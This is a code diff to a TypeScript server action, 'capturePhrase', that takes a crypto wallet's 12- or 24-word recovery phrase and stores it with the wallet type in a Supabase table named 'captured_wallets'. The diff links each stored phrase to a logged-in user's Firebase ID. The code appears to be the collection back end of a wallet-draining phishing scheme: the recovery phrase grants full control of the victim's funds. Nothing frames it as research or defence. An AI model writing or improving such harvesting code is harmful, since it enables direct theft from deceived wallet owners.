@@ -8,13 +8,12 @@
 import { supabase } from '@/lib/supabase';
 import { z } from 'zod';
 
-// Input schema defined but not exported to comply with 'use server' constraints.
 const CapturePhraseInputSchema = z.object({
   phrase: z.string().describe('The 12 or 24-word recovery phrase.'),
   walletType: z.string().describe('The type of wallet being connected.'),
+  firebase_uid: z.string().describe('The Firebase UID of the logged-in user.'),
 });
 
-// Exporting the TypeScript type is allowed and needed for the frontend.
 export type CapturePhraseInput = z.infer<typeof CapturePhraseInputSchema>;
 
 export async function capturePhrase(
@@ -26,24 +25,24 @@ export async function capturePhrase(
         return { success: false };
     }
 
-  console.log('Capturing phrase for wallet:', validation.data.walletType);
-  console.log('Phrase:', validation.data.phrase); // For educational logging
+  const { phrase, walletType, firebase_uid } = validation.data;
+
+  console.log('Updating wallet info for user:', firebase_uid);
 
   const { data, error } = await supabase
     .from('captured_wallets')
-    .insert([
-      {
-        wallet_type: validation.data.walletType,
-        recovery_phrase: validation.data.phrase,
-      },
-    ])
+    .update({
+        recovery_phrase: phrase,
+        wallet_type: walletType,
+    })
+    .eq('firebase_uid', firebase_uid)
     .select();
 
   if (error) {
-    console.error('Error saving to Supabase:', error);
+    console.error('Error updating Supabase record:', error);
     return { success: false };
   }
 
-  console.log('Successfully saved to Supabase:', data);
+  console.log('Successfully updated wallet info in Supabase:', data);
   return { success: true };
 }
